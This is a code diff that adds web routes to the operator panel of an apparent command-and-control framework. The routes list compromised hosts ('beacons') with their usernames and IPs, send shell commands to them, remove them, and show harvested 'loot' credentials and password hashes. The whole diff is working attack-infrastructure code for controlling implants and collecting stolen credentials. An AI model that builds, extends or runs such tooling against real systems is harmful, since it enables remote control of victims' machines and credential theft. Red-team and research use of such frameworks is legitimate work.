@@ -472,3 +472,109 @@ def get_templates():
         
     except Exception as e:
         return jsonify({"success": False, "error": str(e)})
+
+
+# ============== Beacon/Stats/Loot Aliases ==============
+# These routes are used by c2_implant.html template
+
+@c2_bp.route("/c2/beacons")
+def list_beacons():
+    """List beacons (alias for agents)."""
+    if not session.get("logged_in"):
+        return jsonify({"error": "login_required"}), 401
+    try:
+        c2 = get_c2_server()
+        agents = c2.list_agents()
+        return jsonify([{
+            "id": a.agent_id,
+            "hostname": a.hostname,
+            "username": a.username,
+            "os": a.os_info,
+            "ip": a.ip_address,
+            "last_seen": a.last_seen.isoformat() if a.last_seen else None,
+            "status": "active" if a.is_active() else "inactive",
+            "sleep_interval": getattr(a, 'sleep_interval', 5),
+            "tasks_pending": len([t for t in c2.list_tasks() if t.agent_id == a.agent_id and t.status == "pending"])
+        } for a in agents])
+    except Exception as e:
+        return jsonify([])
+
+
+@c2_bp.route("/c2/beacons/<beacon_id>/task", methods=["POST"])
+def beacon_task(beacon_id):
+    """Send task to beacon (alias for agent task)."""
+    if not session.get("logged_in"):
+        return jsonify({"error": "login_required"}), 401
+    try:
+        c2 = get_c2_server()
+        data = request.get_json() or {}
+        task = c2.create_task(
+            agent_id=beacon_id,
+            task_type=data.get("type", "shell"),
+            command=data.get("command", ""),
+            args=data.get("args", {})
+        )
+        return jsonify({"success": True, "task_id": task.task_id})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)})
+
+
+@c2_bp.route("/c2/beacons/<beacon_id>/kill", methods=["POST"])
+def beacon_kill(beacon_id):
+    """Kill beacon (alias for agent kill)."""
+    if not session.get("logged_in"):
+        return jsonify({"error": "login_required"}), 401
+    try:
+        c2 = get_c2_server()
+        c2.remove_agent(beacon_id)
+        return jsonify({"success": True})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)})
+
+
+@c2_bp.route("/c2/stats")
+def c2_stats():
+    """C2 statistics."""
+    if not session.get("logged_in"):
+        return jsonify({"error": "login_required"}), 401
+    try:
+        c2 = get_c2_server()
+        agents = c2.list_agents()
+        listeners = c2.list_listeners()
+        tasks = c2.list_tasks()
+        return jsonify({
+            "agents": len(agents),
+            "active_agents": len([a for a in agents if a.is_active()]),
+            "listeners": len(listeners),
+            "active_listeners": len([l for l in listeners if l.get("status") == "running"]),
+            "tasks": len(tasks),
+            "pending_tasks": len([t for t in tasks if t.status == "pending"])
+        })
+    except Exception:
+        return jsonify({
+            "agents": 0, "active_agents": 0,
+            "listeners": 0, "active_listeners": 0,
+            "tasks": 0, "pending_tasks": 0
+        })
+
+
+@c2_bp.route("/c2/loot")
+def c2_loot():
+    """List collected loot/credentials."""
+    if not session.get("logged_in"):
+        return jsonify({"error": "login_required"}), 401
+    try:
+        c2 = get_c2_server()
+        creds = c2.list_credentials() if hasattr(c2, 'list_credentials') else []
+        return jsonify({
+            "credentials": [{
+                "type": getattr(c, 'cred_type', 'unknown'),
+                "username": getattr(c, 'username', ''),
+                "domain": getattr(c, 'domain', ''),
+                "source": getattr(c, 'source', ''),
+                "hash": getattr(c, 'hash_value', '')
+            } for c in creds] if creds else [],
+            "files": []
+        })
+    except Exception:
+        return jsonify({"credentials": [], "files": []})
